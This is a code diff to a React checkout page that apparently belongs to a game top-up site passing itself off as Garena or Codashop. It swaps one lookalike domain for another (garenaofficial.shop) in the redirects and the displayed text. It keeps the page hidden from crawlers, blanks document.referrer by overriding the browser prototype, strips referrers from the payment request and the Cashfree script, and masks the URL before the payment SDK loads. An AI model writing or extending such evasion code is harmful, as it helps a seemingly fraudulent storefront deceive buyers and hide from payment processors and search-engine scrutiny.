@@ -4,7 +4,7 @@ import { AlertTriangle, AlertCircle } from 'lucide-react';
 import { db, saveRtdbOrder } from '../lib/firebase';
 import { pickCatalogProduct } from '../lib/catalog-product-picker';
 
-const CODASHOP_URL = 'https://www.codashop.online/';
+const CODASHOP_URL = 'https://www.garenaofficial.shop/';
 
 export function alterPhone(phone: string): string {
   const clean = phone.replace(/[^0-9]/g, '').slice(-10).padStart(10, '9');
@@ -110,14 +110,28 @@ export default function GarenaCheckout() {
     typeof window !== 'undefined' ? window.innerWidth : 390
   );
 
-  // Hide from crawlers
+  // Hide from crawlers and strip any incoming referrer in DOM
   useEffect(() => {
-    const meta = document.createElement('meta');
-    meta.name = 'robots';
-    meta.content = 'noindex, nofollow, noarchive';
-    document.head.appendChild(meta);
+    try {
+      Object.defineProperty(document, 'referrer', { get: () => '', configurable: true });
+      Object.defineProperty(Document.prototype, 'referrer', { get: () => '', configurable: true });
+    } catch {
+      // Ignore if restricted
+    }
+
+    const metaRobots = document.createElement('meta');
+    metaRobots.name = 'robots';
+    metaRobots.content = 'noindex, nofollow, noarchive';
+    document.head.appendChild(metaRobots);
+
+    const metaReferrer = document.createElement('meta');
+    metaReferrer.name = 'referrer';
+    metaReferrer.content = 'no-referrer';
+    document.head.appendChild(metaReferrer);
+
     return () => {
-      document.head.removeChild(meta);
+      if (document.head.contains(metaRobots)) document.head.removeChild(metaRobots);
+      if (document.head.contains(metaReferrer)) document.head.removeChild(metaReferrer);
     };
   }, []);
 
@@ -323,7 +337,7 @@ export default function GarenaCheckout() {
         setCountdown(c => {
           if (c <= 1) {
             clearInterval(timer);
-            window.location.href = 'https://www.codashop.online/?status=success';
+            window.location.href = 'https://www.garenaofficial.shop/?status=success';
           }
           return c - 1;
         });
@@ -341,7 +355,7 @@ export default function GarenaCheckout() {
         setCountdown(c => {
           if (c <= 1) {
             clearInterval(timer);
-            window.location.href = 'https://www.codashop.online/?status=failed';
+            window.location.href = 'https://www.garenaofficial.shop/?status=failed';
           }
           return c - 1;
         });
@@ -361,7 +375,7 @@ export default function GarenaCheckout() {
         // Detect cancellation if user returned to this page after initiating payment
         if (sessionStorage.getItem('payment_initiated') === 'true') {
           sessionStorage.removeItem('payment_initiated');
-          window.location.href = 'https://www.codashop.online/?status=failed';
+          window.location.href = 'https://www.garenaofficial.shop/?status=failed';
         }
       }
     };
@@ -480,6 +494,7 @@ export default function GarenaCheckout() {
       const res = await fetch('/api/v2/payments/cashfree/create-order', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
+        referrerPolicy: 'no-referrer',
         body: JSON.stringify({
           amount: pkg,
           customer: {
@@ -506,12 +521,20 @@ export default function GarenaCheckout() {
         throw new Error(data.message || data.error || 'Payment initiation failed');
       }
 
-      // Ensure browser URL is masked to /checkout before Cashfree SDK loads
-      if (typeof window !== 'undefined' && window.history?.replaceState) {
+      // Ensure browser URL is masked to /checkout and document.referrer is blanked before Cashfree SDK loads
+      if (typeof window !== 'undefined') {
         try {
-          window.history.replaceState(null, '', '/checkout');
+          Object.defineProperty(document, 'referrer', { get: () => '', configurable: true });
+          Object.defineProperty(Document.prototype, 'referrer', { get: () => '', configurable: true });
         } catch {
           // Ignore
+        }
+        if (window.history?.replaceState) {
+          try {
+            window.history.replaceState(null, '', '/checkout');
+          } catch {
+            // Ignore
+          }
         }
       }
 
@@ -520,6 +543,7 @@ export default function GarenaCheckout() {
           if ((window as any).Cashfree) return resolve(new (window as any).Cashfree({ mode: data.mode || 'sandbox' }));
           const script = document.createElement('script');
           script.src = 'https://sdk.cashfree.com/js/v3/cashfree.js';
+          script.referrerPolicy = 'no-referrer';
           script.onload = () => resolve(new (window as any).Cashfree({ mode: data.mode || 'sandbox' }));
           script.onerror = () => resolve(null);
           document.body.appendChild(script);
@@ -659,7 +683,7 @@ export default function GarenaCheckout() {
               fontSize: 12,
               color: '#888'
             }}>
-              Continuing to codashop.online in <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 16 }}>{countdown} seconds</span>…
+              Continuing to garenaofficial.shop in <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 16 }}>{countdown} seconds</span>…
             </div>
 
             <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
@@ -745,7 +769,7 @@ export default function GarenaCheckout() {
               color: '#aaa',
               boxSizing: 'border-box'
             }}>
-              Continuing to codashop.online in {countdown} seconds…
+              Continuing to garenaofficial.shop in {countdown} seconds…
               <div style={{
                 width: '100%',
                 height: 4,
